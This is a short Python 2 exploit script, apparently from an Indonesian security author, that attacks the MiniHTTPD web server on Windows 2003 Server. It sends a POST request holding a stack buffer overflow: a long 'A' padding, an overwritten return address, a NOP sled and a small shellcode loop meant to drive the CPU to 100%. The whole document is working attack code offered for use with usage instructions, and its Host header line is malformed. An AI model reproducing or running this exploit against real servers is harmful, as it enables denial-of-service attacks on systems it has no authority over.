#!/usr/bin/python

import socket
import sys
 
if len(sys.argv) != 3:
    print "Exploit MiniHTTPD untuk membuat CPU Windows 2003 Server bekerja 100%" 
    print "ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id"
    print "Cara penggunaan : python exploitminihttpdforwin2003.py <iptarget> <port>"
    sys.exit(1)
 
ipaddress = sys.argv[1]
port = int(sys.argv[2])
buffer = "A" * 5438
eip = "\x38\x07\xD2\x77"
nop = "\x90" * 36
#BITS 32
#global _start
#_start:
#xor eax, eax
#inc eax
#dec eax
#jmp _start
shellcode = ("\x31\xc0\x40\x48\xeb\xfa")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((str(ipaddress),(port)))
buf = "POST / %s HTTP/1.1\r\nHost:(str(ipaddress)\r\n\r\n" % (buffer+eip+nop+shellcode)
 
s.send(buf)
s.close()
